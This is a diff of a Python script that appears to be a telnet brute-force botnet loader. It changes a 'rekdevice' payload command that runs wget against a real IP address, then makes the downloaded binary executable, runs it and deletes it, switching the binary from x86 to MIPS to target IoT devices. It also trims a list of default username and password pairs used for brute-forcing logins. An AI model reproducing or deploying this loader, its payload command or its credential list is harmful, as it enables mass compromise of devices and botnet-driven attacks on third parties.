@@ -6,7 +6,7 @@ if len(sys.argv) < 3:
     print("Usage: python " + sys.argv[0] + " <threads> <output file>")
     sys.exit()
 
-rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/windy.x86; chmod +x windy.x86; ./windy.x86; rm -rf windy.x86"
+rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://152.42.212.230/windy.mips; chmod +x windy.mips; ./windy.mips; rm -rf windy.mips"
 
 combo = [ 
     "root:root", "root:", "admin:admin", "telnet:telnet", "support:support", "user:user",
@@ -19,7 +19,7 @@ combo = [
     "admin:admin1234", "root:1111", "admin:smcadmin", "admin:1111", "root:666666", "root:password",
     "root:1234", "root:klv123", "Administrator:admin", "service:service", "supervisor:supervisor",
     "guest:guest", "guest:12345", "admin1:password", "administrator:1234", "666666:666666",
-    "888888:888888", "tech:tech", "mother:fucker", "root:admin", "admin:root"
+    "888888:888888", "tech:tech", "mother:fucker"
 ]
 
 threads = int(sys.argv[1])
